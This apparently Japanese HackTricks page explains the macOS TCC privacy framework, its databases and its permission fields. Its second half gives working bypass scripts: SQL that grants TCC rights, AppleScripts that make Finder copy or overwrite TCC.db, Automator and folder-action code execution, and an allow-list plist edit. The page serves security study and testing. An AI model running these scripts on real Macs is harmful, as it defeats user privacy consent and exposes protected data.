# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を見たいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。**
* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、ハッキングのコツを共有してください。**

</details>

## **基本情報**

**TCC (Transparency, Consent, and Control)** はmacOSのメカニズムで、主にプライバシーの観点から、特定の機能へのアプリケーションアクセスを**制限し制御する**ためのものです。これには、位置情報サービス、連絡先、写真、マイク、カメラ、アクセシビリティ、フルディスクアクセスなどが含まれます。

ユーザーの視点からは、アプリケーションがTCCによって保護されている機能へのアクセスを求めるときに、**TCCが動作しているのを見ることができます**。このとき、**ユーザーにはダイアログが表示され**、アクセスを許可するかどうかを尋ねられます。

また、ユーザーがプログラムにファイルを**ドラッグ＆ドロップする**など、ユーザーの**明示的な意図**によってアプリにファイルへのアクセスを**許可する**ことも可能です（もちろん、プログラムはそれにアクセスできるべきです）。

![TCCプロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**は、`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`にある**デーモン**によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`で設定されています（machサービス`com.apple.tccd.system`を登録）。

ログインしている各ユーザーごとに実行される**ユーザーモードのtccd**が`/System/Library/LaunchAgents/com.apple.tccd.plist`に定義されており、machサービス`com.apple.tccd`と`com.apple.usernotifications.delegate.com.apple.tccd`を登録しています。

ここでは、システムとして、またユーザーとして実行されているtccdを見ることができます：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
権限は**親アプリケーションから継承され**、**権限**は**Bundle ID**と**Developer ID**に基づいて**追跡されます**。

### TCC データベース

許可/拒否はいくつかの TCC データベースに保存されます：

* システム全体のデータベースは **`/Library/Application Support/com.apple.TCC/TCC.db`** にあります。
* このデータベースは **SIP 保護されている**ため、SIP バイパスでのみ書き込むことができます。
* ユーザーごとの設定用のユーザー TCC データベース **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 。
* このデータベースは保護されているため、フルディスクアクセスのような高い TCC 権限を持つプロセスのみが書き込むことができます（しかし、SIP によって保護されていません）。

{% hint style="warning" %}
前述のデータベースは読み取りアクセスに対しても **TCC で保護されています**。そのため、TCC 権限を持つプロセスからでない限り、通常のユーザー TCC データベースを**読むことはできません**。

ただし、これらの高権限（**FDA** や **`kTCCServiceEndpointSecurityClient`** のような）を持つプロセスは、ユーザーの TCC データベースに書き込むことができることを覚えておいてください。
{% endhint %}

* **位置情報サービス**へのアクセスを許可するクライアントを示す **3番目** の TCC データベースが **`/var/db/locationd/clients.plist`** にあります。
* SIP 保護されたファイル **`/Users/carlospolop/Downloads/REG.db`**（TCC による読み取りアクセスからも保護されています）には、すべての**有効な TCC データベース**の**位置情報**が含まれています。
* SIP 保護されたファイル **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（TCC による読み取りアクセスからも保護されています）には、さらに多くの TCC 付与権限が含まれています。
* SIP 保護されたファイル **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（しかし誰でも読むことができます）は、TCC 例外が必要なアプリケーションの許可リストです。&#x20;

{% hint style="success" %}
**iOS** の TCC データベースは **`/private/var/mobile/Library/TCC/TCC.db`** にあります。
{% endhint %}

{% hint style="info" %}
**通知センター UI** はシステム TCC データベースに**変更を加える**ことができます：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

しかし、ユーザーは**`tccutil`** コマンドラインユーティリティを使って**ルールを削除または照会**することができます。
{% endhint %}

#### データベースの照会

{% tabs %}
{% tab title="ユーザーDB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="システム DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
両方のデータベースをチェックすることで、アプリが許可している権限、禁止している権限、または持っていない権限（要求される）を確認できます。
{% endhint %}

* **`service`** はTCCの**権限**の文字列表現です
* **`client`** は権限を持つ**バンドルID**または**バイナリへのパス**です
* **`client_type`** はそれがバンドル識別子(0)か絶対パス(1)かを示します

<details>

<summary>絶対パスの場合の実行方法</summary>

**`launctl load you_bin.plist`** を実行するだけです。plistは以下のようになります:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** には異なる値があります: denied(0), unknown(1), allowed(2), limited(3)。
* **`auth_reason`** は以下の値を取ることができます: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** フィールドは、バイナリを検証してTCC権限を付与する方法を示しています：
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* テーブルの**他のフィールド**についての詳細は、[**このブログ投稿をチェックしてください**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

アプリに**既に与えられている権限**を `システム環境設定 --> セキュリティとプライバシー --> プライバシー --> ファイルとフォルダ` で確認することもできます。

{% hint style="success" %}
ユーザーは **`tccutil`** を使用してルールを**削除または照会**_できます_。&#x20;
{% endhint %}

#### TCC権限のリセット
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 署名チェック

TCC **データベース**はアプリケーションの**Bundle ID**を保存しますが、許可を求めるアプリが正しいものであることを**確認する**ために、**署名**に関する**情報**も**保存**します。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
したがって、同じ名前とバンドルIDを使用する他のアプリケーションは、他のアプリに付与された権限にアクセスすることができません。
{% endhint %}

### エンタイトルメントとTCC権限

アプリは、リソースへの**アクセスを要求し、アクセスが許可されるだけでなく**、**関連するエンタイトルメントを持っている必要があります**。\
例えば**Telegram**は、**カメラへのアクセスを要求する**ために`com.apple.security.device.camera`というエンタイトルメントを持っています。この**エンタイトルメントを持っていないアプリ**はカメラにアクセスすることが**できず**、ユーザーに権限を求めることもありません。

しかし、`~/Desktop`、`~/Downloads`、`~/Documents`などの**特定のユーザーフォルダへのアクセス**には、特定の**エンタイトルメントは必要ありません**。システムはアクセスを透過的に処理し、必要に応じて**ユーザーにプロンプトを表示します**。

Appleのアプリは**プロンプトを生成しません**。それらは**エンタイトルメントリストに事前に付与された権利を含んでおり**、**ポップアップを生成することはなく**、**TCCデータベースにも表示されません**。例えば：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
この操作により、カレンダーがリマインダー、カレンダー、およびアドレス帳へのアクセスをユーザーに求めることを避けることができます。

{% hint style="success" %}
エンタイトルメントに関する公式ドキュメントの他に、[**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) でエンタイトルメントに関する**興味深い非公式情報**も見つけることができます。
{% endhint %}

いくつかのTCC権限には、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotosなどがあります。これらをすべて定義する公開リストはありませんが、[**既知のリスト**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)を確認できます。

### センシティブで保護されていない場所

* $HOME（自体）
* $HOME/.ssh、$HOME/.aws など
* /tmp

### ユーザーの意図 / com.apple.macl

以前に述べたように、アプリにファイルをドラッグ＆ドロップすることで**そのアプリにファイルへのアクセスを許可する**ことが可能です。このアクセスはTCCデータベースには指定されませんが、ファイルの**拡張属性**として保存されます。この属性は許可されたアプリの**UUIDを保存**します。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
**`com.apple.macl`** 属性は、tccdではなく**Sandbox**によって管理されていることが興味深いです。

また、あなたのコンピューターのアプリのUUIDを許可するファイルを別のコンピューターに移動した場合、同じアプリでも異なるUIDを持つため、そのアプリにアクセスを許可しないことに注意してください。
{% endhint %}

拡張属性 `com.apple.macl` は、**SIPによって保護されている**ため、他の拡張属性のように**クリアすることはできません**。しかし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**圧縮**して、**削除**してから**解凍**することで無効にすることが可能です。

## TCC Privesc & Bypasses

### TCCに挿入

いつかTCCデータベースに対する書き込みアクセスを得ることができたら、以下のようなものを使用してエントリを追加することができます（コメントは削除してください）：

<details>

<summary>TCCに挿入する例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Automation (Finder) to FDA\*

TCCのAutomation権限の名前は: **`kTCCServiceAppleEvents`**\
この特定のTCC権限は、TCCデータベース内で**管理できるアプリケーション**も示しています（つまり、権限はすべてを管理できるわけではありません）。

**Finder**は、UIに表示されなくても**常にFDAを持っている**アプリケーションです。したがって、Finderに対する**Automation**権限を持っている場合、その権限を悪用して**特定のアクションを実行させる**ことができます。\
この場合、あなたのアプリは**`com.apple.Finder`**に対する**`kTCCServiceAppleEvents`**の権限が必要になります。

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}

{% tab title="システムのTCC.dbを盗む" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

これを悪用して**独自のユーザーTCCデータベースを書く**ことができます。

{% hint style="warning" %}
この権限を持っていると、**FinderにTCC制限フォルダへのアクセスを要求**してファイルを取得させることができますが、afaik **Finderに任意のコードを実行させてFDAアクセスを完全に悪用することはできません**。

したがって、FDAの能力を完全に悪用することはできません。
{% endhint %}

これはFinderに対する自動化権限を得るためのTCCプロンプトです：

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator**アプリがTCC権限**`kTCCServiceAppleEvents`**を持っているため、Finderのような**任意のアプリを制御**できることに注意してください。したがって、Automatorを制御する権限を持っていれば、以下のようなコードで**Finder**も制御できます：
{% endhint %}

<details>

<summary>Automator内でシェルを取得する</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editorアプリ**では、Finderを制御できますが、AppleScriptを使用してスクリプトを強制的に実行することはできません。

### オートメーション (SE) から一部のTCCへ

System Eventsはフォルダアクションを作成でき、フォルダアクションは一部のTCCフォルダにアクセスできるため、以下のようなスクリプトを使用してこの挙動を悪用することができます：
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("/Applications/iTerm.app/Contents/MacOS/iTerm2");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# Open the folder, this won't be enough, but just getting out of it, or getting it is enough to trigger the folder action script
open "$HOME/Desktop"
```
### オートメーション (SE) + アクセシビリティ (**`kTCCServicePostEvent`)** から FDA\* へ

**`System Events`** 上のオートメーション + アクセシビリティ (**`kTCCServicePostEvent`**) は、**プロセスへのキーストロークを送信**することを可能にします。この方法を利用して、Finder を悪用してユーザーの TCC.db を変更したり、任意のアプリに FDA を与えることができます（ただし、これにはパスワードの入力が求められるかもしれません）。

Finder がユーザーの TCC.db を上書きする例：
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### **エンドポイントセキュリティクライアントからFDAへ**

**`kTCCServiceEndpointSecurityClient`** を持っていれば、FDAを持っています。終わり。

### システムポリシーシスアドミンファイルからFDAへ

**`kTCCServiceSystemPolicySysAdminFiles`** はユーザーの **`NFSHomeDirectory`** 属性を **変更** することを許可し、これによりホームフォルダを変更し、TCCを **バイパス** することができます。

### ユーザーTCC DBからFDAへ

ユーザーTCCデータベースの **書き込み権限** を取得しても、自分自身に **`FDA`** 権限を付与することは **できません**。システムデータベースに存在するものだけがその権限を付与できます。

しかし、**`Finderへの自動化権限`** を自分自身に付与し、前述の技術を悪用してFDAにエスカレートすることは **できます**\*。

### **FDAからTCC権限へ**

**フルディスクアクセス** のTCC名は **`kTCCServiceSystemPolicyAllFiles`** です

これが実際の権限昇格であるとは思いませんが、役立つかもしれないので念のために記載します：FDAを制御するプログラムを持っている場合、ユーザーのTCCデータベースを **変更し、任意のアクセス権を自分自身に付与** することができます。これは、FDA権限を失う可能性がある場合の持続性技術として役立つかもしれません。

### **SIPバイパスからTCCバイパスへ**

システムの **TCCデータベース** は **SIP** によって保護されているため、指定された権限を持つプロセスのみがそれを **変更することができます**。したがって、攻撃者が **ファイル** に対する **SIPバイパス**（SIPによって制限されたファイルを変更できる）を見つけた場合、以下のことが可能になります：

* TCCデータベースの保護を **解除し、すべてのTCC権限を自分自身に付与** する。例えば、これらのファイルを悪用することができます：
* TCCシステムデータベース
* REG.db
* MDMOverrides.plist

しかし、この **SIPバイパスをTCCバイパスに悪用する** 別の方法があります。ファイル `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` は、TCC例外が必要なアプリケーションの許可リストです。したがって、攻撃者がこのファイルから **SIP保護を解除** し、自分の **アプリケーションを追加** することができれば、そのアプリケーションはTCCをバイパスできるようになります。\
例えば、ターミナルを追加するには：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC バイパス

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考文献

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksに会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
